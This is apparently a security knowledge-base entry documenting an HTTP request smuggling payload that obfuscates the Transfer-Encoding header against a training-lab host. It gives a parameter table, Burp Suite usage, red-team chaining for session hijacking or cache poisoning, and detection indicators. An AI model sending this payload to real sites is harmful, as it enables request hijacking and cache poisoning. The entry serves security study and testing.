---
id: b9ff8930-f640-4df5-bbaa-b9c132e99747
type: code
language: http
verified: true
created_at: '2020-08-12T03:10:39.261262+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
tags:
  - http-request-smuggling
  - payload
  - web-vulnerability
platforms:
  - Web
validated: true
---

# HTTP-Request-Smuggling-TE-Obfuscation-Payload

## Code

```http
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow
5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1 
0
```

## Description

This HTTP request payload exploits HTTP Request Smuggling by obfuscating the Transfer-Encoding header. It includes a primary POST request with a short Content-Length, but uses chunked encoding for the body containing a smuggled secondary POST request. The duplicate 'Transfer-encoding: cow' (invalid value) causes the front-end server to ignore chunked encoding and parse based on Content-Length: 4, treating the rest as the next request. The back-end, however, processes the full chunked body, executing the hidden 'GPOST' as a separate request.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Host | Target hostname (replace with vulnerable lab or app domain) | your-lab-id.web-security-academy.net |
| Content-length | Fixed length for front-end parsing (must be small to truncate) | 4 |
| 5c | Hex chunk size for the smuggled payload (92 bytes) | 5c |
| GPOST | Smuggled request prefix ('G' avoids immediate parsing; adjust payload as needed) | GPOST / HTTP/1.1... |
| x=1 | Example form data in smuggled request | x=1 |
| 0 | Zero-length chunk to end encoding | 0 |

## Usage

This payload is used in tools like Burp Suite Repeater: intercept a base POST, replace with this modified version, and send. It tests for TE header obfuscation vulnerabilities in proxy-fronted web apps. Deliver via manual crafting or automated fuzzing scripts. In a red team scenario, chain with subsequent requests to hijack sessions or poison caches.

## Detection

- WAF logs showing duplicate or case-varied Transfer-Encoding headers.
- Anomalous chunked requests with short Content-Length mismatches.
- Backend logs with unexpected requests following valid ones.
- Network inspection for non-standard HTTP parsing indicators.

## Related

- [[procedures/HTTP-Request-Smuggling-Obfuscating-TE-Header]]
- [[tools/Burp-Suite]]
